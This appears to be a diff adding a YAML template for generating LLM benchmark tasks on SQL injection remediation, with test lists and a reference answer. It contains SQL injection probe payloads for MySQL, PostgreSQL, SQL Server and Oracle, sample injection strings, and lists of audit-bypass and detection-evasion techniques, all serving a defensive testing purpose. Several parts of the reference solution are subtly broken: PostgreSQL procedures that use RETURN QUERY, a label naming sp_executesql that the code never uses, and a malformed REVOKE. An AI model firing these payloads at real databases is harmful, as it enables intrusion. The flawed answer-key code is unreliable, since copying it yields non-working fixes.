+        - "Cross-shard privilege escalation"
+        - "Coordinator node exploitation"
+      multiplier: 2.3
+    
+    replication_based_attacks:
+      injection_via_replication:
+        - "Replication stream injection"
+        - "Subscriber privilege exploitation"
+        - "CDC change manipulation"
+        - "Logical decoding exploitation"
+      multiplier: 2.1
+    
+    cloud_database_specific:
+      cloud_injection_vectors:
+        - "Managed database API exploitation"
+        - "IAM role assumption via injection"
+        - "Cloud function invocation"
+        - "Cross-account access exploitation"
+      multiplier: 2.4
+    
+    nosql_injection_correlation:
+      mongodb_injection:
+        - "NoSQL operator injection"
+        - "JavaScript code injection"
+        - "Aggregation pipeline manipulation"
+        - "Server-side JavaScript exploitation"
+      multiplier: 1.9
+  
+  defense_factors:
+    - factor: "waf_present"
+      multiplier: 1.5
+      description: "Web Application Firewall in place"
+    
+    - factor: "parameterized_queries_partial"
+      multiplier: 1.3
+      description: "Some queries parameterized"
+    
+    - factor: "input_validation_present"
+      multiplier: 1.4
+      description: "Input validation exists"
+    
+    - factor: "error_handling_proper"
+      multiplier: 1.3
+      description: "Errors don't reveal info"
+  
+  attack_factors:
+    - factor: "blind_only"
+      multiplier: 1.6
+      description: "Only blind injection possible"
+    
+    - factor: "limited_privileges"
+      multiplier: 1.4
+      description: "Database user has minimal privileges"
+    
+    - factor: "rate_limiting"
+      multiplier: 1.3
+      description: "Request rate limiting active"
+    
+    - factor: "multi_step_exploitation"
+      multiplier: 1.7
+      description: "Requires chained vulnerabilities"
+  
+  context_factors:
+    - factor: "production_environment"
+      multiplier: 1.5
+      description: "Real production data at risk"
+    
+    - factor: "compliance_requirements"
+      multiplier: 1.4
+      description: "PCI-DSS, HIPAA, etc."
+    
+    - factor: "incident_response_needed"
+      multiplier: 1.3
+      description: "Must also create IR plan"
+
+# =============================================================================
+# DATABASE SYSTEM SPECIFICS
+# =============================================================================
+
+database_specifics:
+  mysql:
+    versions: ["5.7", "8.0", "8.1"]
+    injection_features:
+      - "INTO OUTFILE"
+      - "LOAD_FILE()"
+      - "User-defined variables"
+      - "Prepared statement limitations"
+    detection_payloads:
+      - "' AND SLEEP(5)--"
+      - "' AND BENCHMARK(10000000,SHA1('test'))--"
+    schema_extraction:
+      - "SELECT table_name FROM information_schema.tables"
+      - "SELECT column_name FROM information_schema.columns"
+    
+  postgresql:
+    versions: ["12", "13", "14", "15", "16"]
+    injection_features:
+      - "COPY TO PROGRAM"
+      - "dblink extension"
+      - "lo_import/lo_export"
+      - "Dollar quoting"
+    detection_payloads:
+      - "' AND pg_sleep(5)--"
+      - "' AND 1=1--"
+    schema_extraction:
+      - "SELECT tablename FROM pg_tables"
+      - "SELECT column_name FROM information_schema.columns"
+    
+  sql_server:
+    versions: ["2016", "2017", "2019", "2022"]
+    injection_features:
+      - "xp_cmdshell"
+      - "xp_dirtree"
+      - "OPENROWSET"
+      - "Linked servers"
+    detection_payloads:
+      - "' WAITFOR DELAY '0:0:5'--"
+      - "' AND 1=CONVERT(int, @@version)--"
+    schema_extraction:
+      - "SELECT name FROM sys.tables"
+      - "SELECT name FROM sys.columns"
+    
+  oracle:
+    versions: ["19c", "21c", "23c"]
+    injection_features:
+      - "UTL_HTTP"
+      - "UTL_FILE"
+      - "DBMS_PIPE"
+      - "Java procedures"
+    detection_payloads:
+      - "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"
+      - "' AND 1=UTL_INADDR.get_host_name('test')--"
+    schema_extraction:
+      - "SELECT table_name FROM all_tables"
+      - "SELECT column_name FROM all_tab_columns"
+
+# =============================================================================
+# PROBLEM STATEMENT TEMPLATES
+# =============================================================================
+
+problem_statement: |
+  A {{ application_type }} has potential SQL injection vulnerabilities.
+  The application uses {{ database_system }} {{ database_version }} and is built with
+  {{ framework_technology }}.
+  
+  The application has:
+  {{ application_features }}
+  
+  Security measures in place:
+  - WAF: {{ waf_type }}
+  - Input validation: {{ validation_type }}
+  - Error handling: {{ error_handling }}
+  - Database permissions: {{ db_permissions }}
+  
+  Task context:
+  {{ task_context }}
+
+requirements: |
+  - Identify all SQL injection vectors
+  - Assess the severity of each vulnerability
+  - Implement comprehensive remediation
+  - Handle {{ edge_cases }} edge cases
+  - Ensure {{ compliance_standard }} compliance
+  - Provide {{ testing_approach }} testing strategy
+
+interface: |
+  Input: {{ input_description }}
+  Output: {{ output_description }}
+  Validation: {{ validation_criteria }}
+
+# =============================================================================
+# REFERENCE SOLUTION PATTERNS
+# =============================================================================
+
+reference_solution: |
+  -- Comprehensive SQL Injection Prevention Guide
+  
+  -- ============================================================
+  -- PATTERN 1: Parameterized Queries
+  -- ============================================================
+  
+  /*
+  VULNERABLE:
+  SELECT * FROM users WHERE username = '" + username + "' 
+                      AND password = '" + password + "'
+  
+  Injection: username = "admin'--"
+  Result: SELECT * FROM users WHERE username = 'admin'--' AND password = ''
+  */
+  
+  -- PostgreSQL parameterized query
+  PREPARE user_login AS
+  SELECT * FROM users WHERE username = $1 AND password = $2;
+  EXECUTE user_login('admin', 'password123');
+  
+  -- ============================================================
+  -- Python Example (psycopg2)
+  -- ============================================================
+  
+  /*
+  # VULNERABLE
+  cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
+  
+  # SECURE - Parameterized
+  cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
+  
+  # SECURE - With named parameters
+  cursor.execute(
+      "SELECT * FROM users WHERE username = %(username)s",
+      {'username': username}
+  )
+  */
+  
+  -- ============================================================
+  -- PATTERN 2: Stored Procedure Security
+  -- ============================================================
+  
+  /*
+  VULNERABLE stored procedure:
+  
+  CREATE PROCEDURE SearchUsers @SearchTerm NVARCHAR(100)
+  AS
+  BEGIN
+    DECLARE @SQL NVARCHAR(500)
+    SET @SQL = 'SELECT * FROM Users WHERE Name LIKE ''%' + @SearchTerm + '%'''
+    EXEC(@SQL)
+  END
+  
+  Injection: SearchUsers "'; DROP TABLE Users;--"
+  */
+  
+  -- SECURE stored procedure with sp_executesql
+  CREATE OR REPLACE PROCEDURE search_users_safe(search_term VARCHAR)
+  AS $$
+  BEGIN
+    -- Use parameterized query inside procedure
+    RETURN QUERY
+    SELECT * FROM users
+    WHERE name ILIKE '%' || search_term || '%';
+  END;
+  $$ LANGUAGE plpgsql;
+  
+  -- Even safer: whitelist pattern characters
+  CREATE OR REPLACE FUNCTION escape_like_pattern(input TEXT)
+  RETURNS TEXT AS $$
+  BEGIN
+    RETURN REPLACE(REPLACE(REPLACE(input, '\', '\\'), '%', '\%'), '_', '\_');
+  END;
+  $$ LANGUAGE plpgsql;
+  
+  CREATE OR REPLACE PROCEDURE search_users_safest(search_term VARCHAR)
+  AS $$
+  DECLARE
+    safe_term TEXT;
+  BEGIN
+    safe_term := escape_like_pattern(search_term);
+    RETURN QUERY
+    SELECT * FROM users
+    WHERE name ILIKE '%' || safe_term || '%';
+  END;
+  $$ LANGUAGE plpgsql;
+  
+  -- ============================================================
+  -- PATTERN 3: Dynamic Table/Column Names
+  -- ============================================================
+  
+  /*
+  Challenge: Cannot parameterize identifiers
+  
+  VULNERABLE:
+  cursor.execute(f"SELECT * FROM {table_name}")
+  */
+  
+  -- SOLUTION: Whitelist allowed identifiers
+  
+  CREATE OR REPLACE FUNCTION safe_table_query(table_name TEXT)
+  RETURNS SETOF RECORD AS $$
+  DECLARE
+    allowed_tables TEXT[] := ARRAY['users', 'products', 'orders'];
+  BEGIN
+    -- Validate table name against whitelist
+    IF NOT (table_name = ANY(allowed_tables)) THEN
+      RAISE EXCEPTION 'Invalid table name: %', table_name;
+    END IF;
+    
+    -- Use format with %I for identifier quoting
+    RETURN QUERY EXECUTE format(
+      'SELECT * FROM %I',
+      table_name
+    );
+  END;
+  $$ LANGUAGE plpgsql;
+  
+  -- For ORDER BY with user input
+  CREATE OR REPLACE FUNCTION safe_order_by_query(
+    order_column TEXT,
+    order_direction TEXT DEFAULT 'ASC'
+  )
+  RETURNS SETOF users AS $$
+  DECLARE
+    allowed_columns TEXT[] := ARRAY['id', 'name', 'email', 'created_at'];
+  BEGIN
+    -- Validate column
+    IF NOT (order_column = ANY(allowed_columns)) THEN
+      RAISE EXCEPTION 'Invalid column: %', order_column;
+    END IF;
+    
+    -- Validate direction
+    IF order_direction NOT IN ('ASC', 'DESC') THEN
+      order_direction := 'ASC';
+    END IF;
+    
+    RETURN QUERY EXECUTE format(
+      'SELECT * FROM users ORDER BY %I %s',
+      order_column,
+      order_direction
+    );
+  END;
+  $$ LANGUAGE plpgsql;
+  
+  -- ============================================================
+  -- PATTERN 4: Second-Order Injection Prevention
+  -- ============================================================
+  
+  /*
+  PROBLEM: Data stored safely, used unsafely later
+  
+  1. User registers with username: "admin'--"
+  2. Username stored via parameterized INSERT (safe)
+  3. Admin report uses: "SELECT * FROM logs WHERE user = '" + stored_username + "'"
+  */
+  
+  -- SOLUTION: ALWAYS parameterize, even with internal data
+  
+  -- Even for data from our own database:
+  CREATE OR REPLACE FUNCTION get_user_logs(user_id INT)
+  RETURNS SETOF logs AS $$
+  DECLARE
+    v_username TEXT;
+  BEGIN
+    -- Get username (could contain malicious data)
+    SELECT username INTO v_username FROM users WHERE id = user_id;
+    
+    -- STILL parameterize the query!
+    RETURN QUERY
+    SELECT * FROM logs WHERE username = v_username;
+    
+    -- NOT: EXECUTE 'SELECT * FROM logs WHERE username = ''' || v_username || ''''
+  END;
+  $$ LANGUAGE plpgsql;
+  
+  -- ============================================================
+  -- PATTERN 5: Error Handling
+  -- ============================================================
+  
+  /*
+  VULNERABLE: Exposing SQL errors to users
+  
+  Python example:
+  try:
+      cursor.execute(query)
+  except Exception as e:
+      return {"error": str(e)}  # Reveals database structure!
+  */
+  
+  -- Application code pattern:
+  
+  /*
+  Python secure error handling:
+  
+  import logging
+  
+  logger = logging.getLogger(__name__)
+  
+  def execute_query_safely(cursor, query, params):
+      try:
+          cursor.execute(query, params)
+          return cursor.fetchall()
+      except psycopg2.Error as e:
+          # Log full error for debugging
+          logger.error(f"Database error: {e.pgerror}", exc_info=True)
+          logger.error(f"Query: {query}")
+          logger.error(f"Params: {params}")
+          
+          # Return generic error to user
+          raise ApplicationError("A database error occurred. Please try again.")
+  */
+  
+  -- ============================================================
+  -- PATTERN 6: Input Validation Layer
+  -- ============================================================
+  
+  /*
+  Defense in depth: validate before it reaches SQL
+  
+  Python example:
+  
+  import re
+  from typing import Optional
+  
+  def validate_username(username: str) -> Optional[str]:
+      # Length check
+      if not 3 <= len(username) <= 50:
+          return None
+      
+      # Character whitelist
+      if not re.match(r'^[a-zA-Z0-9_-]+$', username):
+          return None
+      
+      return username
+  
+  def validate_numeric_id(value: str) -> Optional[int]:
+      try:
+          id_val = int(value)
+          if id_val > 0:
+              return id_val
+      except (ValueError, TypeError):
+          pass
+      return None
+  
+  def validate_email(email: str) -> Optional[str]:
+      # Use email-validator library
+      from email_validator import validate_email as ev
+      try:
+          valid = ev(email)
+          return valid.email
+      except:
+          return None
+  */
+  
+  -- ============================================================
+  -- PATTERN 7: Database Permissions
+  -- ============================================================
+  
+  -- Create application-specific user with minimal permissions
+  
+  CREATE USER app_user WITH PASSWORD 'secure_password';
+  
+  -- Grant only necessary permissions
+  GRANT CONNECT ON DATABASE myapp TO app_user;
+  GRANT USAGE ON SCHEMA public TO app_user;
+  
+  -- Read-only on reference tables
+  GRANT SELECT ON users TO app_user;
+  GRANT SELECT ON products TO app_user;
+  
+  -- Read-write on application tables
+  GRANT SELECT, INSERT, UPDATE ON orders TO app_user;
+  GRANT SELECT, INSERT ON order_items TO app_user;
+  
+  -- No DELETE permission unless needed
+  -- No DROP, CREATE, ALTER permissions
+  -- No access to system tables
+  
+  REVOKE ALL ON information_schema FROM app_user;
+  REVOKE ALL ON pg_catalog FROM app_user;
+  
+  -- ============================================================
+  -- PATTERN 8: WAF Rules (Example)
+  -- ============================================================
+  
+  /*
+  ModSecurity rules example:
+  
+  # Block common SQL injection patterns
+  SecRule ARGS "@detectSQLi" \
+      "id:1,\
+      phase:2,\
+      deny,\
+      status:403,\
+      log,\
+      msg:'SQL Injection Detected'"
+  
+  # Block UNION-based injection
+  SecRule ARGS "@rx (?i:union\s+select)" \
+      "id:2,\
+      phase:2,\
+      deny,\
+      status:403,\
+      log,\
+      msg:'UNION SELECT injection attempt'"
+  */
+  
+  -- ============================================================
+  -- PATTERN 9: Monitoring and Detection
+  -- ============================================================
+  
+  -- PostgreSQL: Log suspicious queries
+  
+  -- In postgresql.conf:
+  -- log_statement = 'all'
+  -- log_min_duration_statement = 0
+  
+  -- Create audit trigger
+  CREATE TABLE sql_audit_log (
+    id SERIAL PRIMARY KEY,
+    query_text TEXT,
+    user_name TEXT,
+    client_ip INET,
+    executed_at TIMESTAMP DEFAULT NOW(),
+    suspicious BOOLEAN DEFAULT FALSE
+  );
+  
+  -- Function to check for suspicious patterns
+  CREATE OR REPLACE FUNCTION check_suspicious_query(query TEXT)
+  RETURNS BOOLEAN AS $$
+  BEGIN
+    RETURN query ~* '(union\s+select|drop\s+table|delete\s+from|insert\s+into|update\s+.*set|;|--)'
+           AND query !~* '^(select|insert|update|delete)\s+';
+  END;
+  $$ LANGUAGE plpgsql;
+
+# =============================================================================
+# TEST CASES
+# =============================================================================
+
+fail_to_pass:
+  - "test_union_injection_blocked"
+  - "test_blind_injection_blocked"
+  - "test_second_order_injection_blocked"
+  - "test_stored_proc_injection_blocked"
+  - "test_numeric_injection_blocked"
+  - "test_like_injection_blocked"
+  - "test_error_messages_generic"
+  - "test_waf_bypass_blocked"
+
+pass_to_pass:
+  - "test_legitimate_query_works"
+  - "test_special_characters_in_data"
+  - "test_unicode_data_handled"
+
+# =============================================================================
+# VARIABLES FOR TASK GENERATION
+# =============================================================================
+
+variables:
+  - name: application_type
+    type: string
+    options:
+      - "e-commerce platform"
+      - "healthcare portal"
+      - "financial application"
+      - "content management system"
+      - "API backend"
+      - "admin dashboard"
+  
+  - name: database_system
+    type: string
+    options: ["PostgreSQL", "MySQL", "SQL Server", "Oracle"]
+  
+  - name: framework_technology
+    type: string
+    options:
+      - "Python/Django"
+      - "Python/Flask"
+      - "Java/Spring"
+      - "Node.js/Express"
+      - "PHP/Laravel"
+      - "Ruby/Rails"
+      - ".NET/C#"
+  
+  - name: waf_type
+    type: string
+    options:
+      - "None"
+      - "ModSecurity"
+      - "AWS WAF"
+      - "Cloudflare"
+      - "Custom rules"
+  
+  - name: validation_type
+    type: string
+    options:
+      - "None"
+      - "Basic escaping"
+      - "Whitelist validation"
+      - "ORM-based"
+
+# =============================================================================
+# ANTI-PATTERNS - LLM Failure Modes
+# =============================================================================
+
+anti_patterns:
+  llm_failure_modes:
+    - "Applying generic SQL patterns without considering database-specific behavior"
+    - "Missing isolation level interactions between concurrent transactions"
+    - "Ignoring lock manager implementation details"
+    - "Not considering query optimizer behavior changes across versions"
+    - "Missing hidden full table scans in seemingly optimized queries"
+    - "Overlooking index maintenance overhead during writes"
+    - "Assuming ORM generates efficient queries"
+    - "Missing deadlock potential in cross-schema operations"
+    - "Ignoring transaction log and recovery implications"
+    - "Assuming parameterized queries prevent all injection types"
+    - "Missing second-order injection through stored data"
+    - "Ignoring identifier injection in dynamic table/column names"
+    - "Assuming WAF provides complete injection protection"
+    - "Overlooking encoding bypass techniques (double encoding, Unicode)"
+    - "Missing stored procedure injection through dynamic SQL"
+    - "Assuming ORM automatically prevents all injection vectors"
+    - "Ignoring ORDER BY and GROUP BY injection possibilities"
+    - "Missing LIKE clause wildcard injection"
+    - "Assuming input validation alone prevents injection"
+    - "Overlooking comment-based payload smuggling"
+    - "Missing database-specific function exploitation (xp_cmdshell, UTL_HTTP)"
+    - "Assuming error messages are properly suppressed"
+    - "Ignoring time-based blind injection possibilities"
+    - "Missing out-of-band data exfiltration channels"
+    - "Assuming EXECUTE IMMEDIATE with binding is always safe"
+    - "Overlooking batch statement injection"
+    - "Missing JSON/XML injection in document columns"
+  
+  query_optimizer_internals:
+    injection_detection_evasion:
+      - "Query normalization bypass"
+      - "Plan cache fingerprint manipulation"
+      - "Statistics-based detection evasion"
+      - "Parallel query injection timing"
+    privilege_escalation_paths:
+      - "Definer context privilege inheritance"
+      - "Ownership chaining exploitation"
+      - "Cross-database privilege leakage"
+      - "Role membership manipulation"
+    audit_bypass_techniques:
+      - "Audit trigger circumvention"
+      - "Binary log filtering bypass"
+      - "Slow query log manipulation"
+      - "General log evasion"
+
+# =============================================================================
+# ANTI-HARDCODING MEASURES
+# =============================================================================
+
+anti_hardcoding:
+  canary_tokens: true
+  randomize_paths: true
+  dynamic_content: true
+  randomize_identifiers: true
+  
+  injection_vectors:
+    - "login_form"
+    - "search_box"
+    - "api_parameter"
+    - "http_header"
+    - "cookie_value"
+    - "file_upload_name"
+    - "json_payload"
+  
+  trap_injection:
+    - inject_second_order: true
+    - inject_numeric_bypass: true
+    - inject_encoding_bypass: true
+    - inject_blind_vector: true
